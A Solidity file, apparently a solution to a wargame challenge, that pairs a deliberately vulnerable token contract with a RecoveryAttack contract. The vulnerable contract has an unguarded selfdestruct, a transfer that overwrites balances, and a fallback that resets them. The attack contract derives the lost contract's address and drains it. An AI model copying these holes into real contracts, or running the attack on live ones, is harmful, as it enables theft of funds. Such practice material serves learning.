pragma solidity ^0.4.24;


contract Recovery {

  //generate tokens
  function generateToken(string _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);

  }
}

contract SimpleToken {

  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  function() public payable {
    balances[msg.sender] = msg.value*10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] -= _amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address _to) public {
    selfdestruct(_to);
  }
}


contract RecoveryAttack {

    Recovery victim;

    constructor(address _victim) public {
        victim = Recovery(_victim);

    }

    //addresses are deterministic. to find the first SimpleToken address created
    //from the victim's Recovery contract calculate the sha3 hash of (rlp encoded
    //victim address + nonce 1) n.b. contract's nonces start at 1 POAs at 0
    function attack() external returns(bool success) {
        address lostAddress = address(keccak256(uint8(0xd6), uint8(0x94), address(victim), uint8(0x01)));
        SimpleToken lostContract = SimpleToken(lostAddress);
        lostContract.destroy(address(this));
        return true;
    }

}
